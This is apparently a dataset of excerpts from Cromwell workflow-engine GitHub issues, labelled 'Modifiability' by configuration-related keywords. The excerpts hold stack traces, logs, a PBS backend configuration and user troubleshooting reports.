Modifiability,"s.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.IllegalArgumentException: /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4 exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: s3. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathParsingException.<init>(PathParsingException.scala:5); 	... 35 common frames omitted; 2018-06-13 14:29:48,009 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - a67833cb:demux_only.illumina_demux:-1:1: Hash error, disabling call caching for this job.; cromwell.core.path.PathParsingException: java.lang.IllegalArgumentException: /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4 exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: s3. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathFactory$.$anonfun$buildPath$4(PathFactory.scala:47); 	at scala.Option.getOrElse(Option.scala:121); 	at cromwell.core.path.PathFactory$.buildPath(PathFactory.scala:42); 	at cromwell.core",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:8511,config,configure,8511,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['config'],['configure']
Modifiability,"s.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.IllegalArgumentException: /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4 exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: s3. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathParsingException.<init>(PathParsingException.scala:5); 	... 35 common frames omitted; 2018-06-13 14:29:48,013 cromwell-system-akka.dispatchers.backend-dispatcher-95 WARN - AwsBatchAsyncBackendJobExecutionActor [UUID(a67833cb)demux_only.illumina_demux:NA:1]: Unrecognized runtime attribute keys: preemptible, dx_instance_type; 2018-06-13 14:29:48,218 cromwell-system-akka.dispatchers.backend-dispatcher-95 INFO - AwsBatchAsyncBackendJobExecutionActor [UUID(a67833cb)demux_only.illumina_demux:NA:1]: `set -ex -o pipefail. if [ -d /mnt/tmp ]; then; TMPDIR=/mnt/tmp; fi; FLOWCELL_DIR=$(mktemp -d). read_utils.py extract_tarball \; /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4 $FLOWCELL_DIR \; --loglevel=DEBUG. # find 95% memory; mem_in_mb=`/opt/viral-ngs/source/docker/mem_in_mb_95.sh`. # note that we are intentionally setting --threads to about 2x the c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:12305,config,configure,12305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['config'],['configure']
Modifiability,"s.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3505,Config,ConfigAsyncJobExecutionActor,3505,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"s/output/knownPromiscuousThree.csv""; },; ""fusion_pairs_csv_linx"": {; ""class"": ""File"",; ""location"": ""/efs/gridss-refdata/External Resources/HMFTools-Resources/Linx/known_fusion_data.hg38.csv""; },; ""gene_transcripts_dir_linx"": {; ""class"": ""File"",; ""location"": ""/efs/gridss-refdata/External Resources/HMFTools-Resources/Linx/ensemble_data_cache_hg38""; },; ""viral_hosts_file_linx"": {; ""class"": ""File"",; ""location"": ""/efs/gridss-refdata/External Resources/HMFTools-Resources/Linx/viral_host_ref.csv""; },; ""replication_origins_file_linx"": {; ""class"": ""File"",; ""location"": ""/efs/gridss-refdata/External Resources/HMFTools-Resources/Linx/heli_rep_origins.bed""; },; ""line_element_file_linx"": {; ""class"": ""File"",; ""location"": ""/efs/gridss-refdata/External Resources/HMFTools-Resources/Linx/line_elements.hg38.csv""; },; ""fragile_site_file_linx"": {; ""class"": ""File"",; ""location"": ""/efs/gridss-refdata/External Resources/HMFTools-Resources/Linx/fragile_sites_hmf.hg38.csv""; }; }; ```. </details>. ## /opt/cromwell/configs/options.json. ```; {; ""final_workflow_outputs_dir"": ""outputs"",; ""use_relative_output_paths"": true,; ""final_workflow_log_dir"": ""wf_logs"",; ""final_call_logs_dir"": ""call_logs""; }; ```. # Metadata Error. <details>. <summary>Click to Expand</summary>. ```; {; ""workflowProcessingEvents"": [; {; ""cromwellId"": ""cromid-0fe86cb"",; ""description"": ""Finished"",; ""timestamp"": ""2020-09-02T09:23:06.270Z"",; ""cromwellVersion"": ""52""; },; {; ""cromwellId"": ""cromid-0fe86cb"",; ""description"": ""PickedUp"",; ""timestamp"": ""2020-09-02T09:23:04.924Z"",; ""cromwellVersion"": ""52""; }; ],; ""metadataSource"": ""Unarchived"",; ""actualWorkflowLanguageVersion"": ""v1.0"",; ""submittedFiles"": {; ""workflow"": ""{\n \""$graph\"": [\n {\n \""class\"": \""CommandLineTool\"",\n \""doc\"": \""AMBER is designed to generate a tumor BAF file for use in PURPLE from a provided VCF of likely heterozygous SNP sites.\\n\\nWhen using paired reference/tumor bams,\\nAMBER confirms these sites as heterozygous in the reference sample bam then calculates t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:60484,config,configs,60484,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['config'],['configs']
Modifiability,"scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script};",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:3892,config,config,3892,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['config'],['config']
Modifiability,scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618:5983,Adapt,AdaptedForkJoinTask,5983,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-215187618,1,['Adapt'],['AdaptedForkJoinTask']
Modifiability,scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$.fromDeclarations(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:38); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:37); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:47); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:46); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.coerceDefaultRuntimeAttributes(SharedFileSystemInitializationActor.scala:90); 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:138); 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.initSequence(SharedFileSystemInitializationActor.scala:37); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowInitializationActor.scala:163); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowIn,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1737:2311,Config,ConfigInitializationActor,2311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1737,1,['Config'],['ConfigInitializationActor']
Modifiability,scala:175); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.writeScriptContents$(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.cromwell$backend$sfs$BackgroundAsyncJobExecutionActor$$super$writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents(BackgroundAsyncJobExecutionActor.scala:12); at cromwell.backend.sfs.BackgroundAsyncJobExecutionActor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:639); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:639); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:639); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:954); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:946); at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); at cromwell.backend.async.AsyncBack,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5092:4420,config,config,4420,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5092,1,['config'],['config']
Modifiability,scala:475); 	 at mouse.AnyOps$.$bar$greater$extension(any.scala:8); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironmentPathMapper(StandardAsyncExecutionActor.scala:475); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironmentPathMapper$(StandardAsyncExecutionActor.scala:473); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironmentPathMapper(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$runtimeEnvironment$1(StandardAsyncExecutionActor.scala:479); 	 at mouse.AnyOps$.$bar$greater$extension(any.scala:8); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironment(StandardAsyncExecutionActor.scala:479); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironment$(StandardAsyncExecutionActor.scala:479); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:637); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:607); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:383); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutionActor.scala:382); 	 at cromwell.backend.impl.sfs.config.DispatchedConfi,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757:5142,Config,ConfigAsyncJobExecutionActor,5142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"scala:545) ; at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283) ; at akka.dispatch.Mailbox.run(Mailbox.scala:224) ; at akka.dispatch.Mailbox.exec(Mailbox.scala:235) ; at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ; at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) ; at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) ; at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) ; Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services' ; at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156) ; at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174) ; at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188) ; at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193) ; at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268) ; at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41) ; at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35) ; at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63) ; at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65) ; at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25) ; at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87) ; at akka.actor.Props.newActor(Props.scala:212) ; at akka.actor.ActorCell.newActor(ActorCell.scala:624) ; at akka.actor.ActorCell.create(ActorCell.scala:650) ; ... 9 more ; ```. If I add in a `services` stanza, though, it asks me to define the class of each service, even though they should probably have default values:; ```; [ERROR] [01/24/2019 11:09:59.741] [cromwell-system-akka.dispatchers.service-dispatcher-10] [akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor] Receiv",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577:1866,config,config,1866,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577,1,['config'],['config']
Modifiability,"scovery_GATK4/b75cd521-c92d-4264-98f4-7a6571860bb3/call-SamToFastqAndBwaMem/shard-0/execution/script; 5035, /bin/bash/n/no_backup2/dbmi/park/gem_wgs/.PreProcessing/.NFRI_S013_M1d.bam/.sh/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/b75cd521-c92d-4264-98f4-7a6571860bb3/call-SamToFastqAndBwaMem/shard-0/execution/script; 24804, /bin/bash/n/no_backup2/dbmi/park/gem_wgs/.PreProcessing/.NFRI_S013_N1.bam/.sh/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/99b4c5f7-50c2-4888-a448-934329112f83/call-MergeBamAlignment/shard-0/execution/script; 3387, /bin/bash/n/no_backup2/dbmi/park/gem_wgs/.PreProcessing/.NFRI_S013_N1.bam/.sh/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/99b4c5f7-50c2-4888-a448-934329112f83/call-MergeBamAlignment/shard-0/execution/script; ; ; I am not sure if this was happening because you started multiple identical jobs or if it is a bug in the cromwell pipeline but it is the reason why those child jobs are hanging now.; ``` . Just to clarify, I did not submit multiple identical jobs. Everything on my end was kosher. . In any case, theres the issue - its not the first I've had with Cromwell (you can see previous discussions related to this at e.g. https://gatkforums.broadinstitute.org/wdl/discussion/comment/50624#Comment_50624) . I had to make lots of modifications to my configuration file before I got it to work as well as it does now. So if you have any idea what is causing this or any changes to my configuration file you'd recommend id greatly appreciate your help. Thanks a lot,. Alon. [rc.tmp.txt](https://github.com/broadinstitute/cromwell/files/2540522/rc.tmp.txt); [script.submit.txt](https://github.com/broadinstitute/cromwell/files/2540523/script.submit.txt); [script.txt](https://github.com/broadinstitute/cromwell/files/2540524/script.txt). [stderr.txt](https://github.com/broadinstitute/cromwell/files/2540525/stderr.txt); [stdout.submit.txt](https://github.com/broadinstitute/cromwell/files/2540526/stdout.submit.txt)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4347:8310,config,configuration,8310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4347,2,['config'],['configuration']
Modifiability,"se 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); [2019-07-10 14:32:54,12] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2019-07-10 14:32:54,13] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-07-10 14:32:54,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2019-07-10 14:32:54,18] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2019-07-10 14:32:54,43] [info] SingleWorkflowRunnerActor: Version 42; [2019-07-10 14:32:54,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2019-07-10 14:32:54,48] [info] Unspecified type (Unspecified version) workflow 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5 submitted; [2019-07-10 14:32:54,50] [info] SingleWorkflowRunnerActor: Workflow submitted 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5; [2019-07-10 14:32:54,50] [info] 1 new workflows fetched by cromid-1cf43fa: 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5; [2019-07-10 14:32:54,51] [info] WorkflowManagerActor Starting workflow 41d3eecf-c5a9-42e4-8a29-8be9c252b7f5; [2019-07-10 14:32:54,51] [info] WorkflowManagerActor Successfully started WorkflowActor-41d3eecf-c5a9-42e4-8a29-8be9c252b7f5; [2019-07-10 14:32:54,52] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2019-07-10 14:32:54,53] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2019-07-10 14:32:54,60] [info] MaterializeWorkflowDescriptorActor [41d3eecf]: Parsing workflow as WDL draft-2; [2019-07-10 14:32:55,28] [info] MaterializeWorkflowDescriptorActor [41d3eecf]: Call-to-Backend assignments: scMeth.trimAdapters -> Local, scMeth.trimCellBarcode -> Local; [2019-07-10 14:32:57,55] [info] WorkflowExecutionActor-41d3eecf-c5a9-42e4-8a29-8be9c252b7f5 [41d3eecf]: Starting scMeth.trimCellBarcode; [2019-07-10 14:32:58,20] [info] Assigned new job execution tokens to the following groups: 41d3ee",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:6641,config,configured,6641,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['config'],['configured']
Modifiability,seable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:39); at scala.util.Either.flatMap(Either.scala:352); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:30); at womtool.input.WomGraphMaker$.fromFiles(WomGraphMaker.scala:46); at womtool.validate.Validate$.validate(Validate.scala:26); at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:54); at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:161); at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:166); at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:27); at scala.Function0.apply$mcV$sp(Function0.scala:42); at 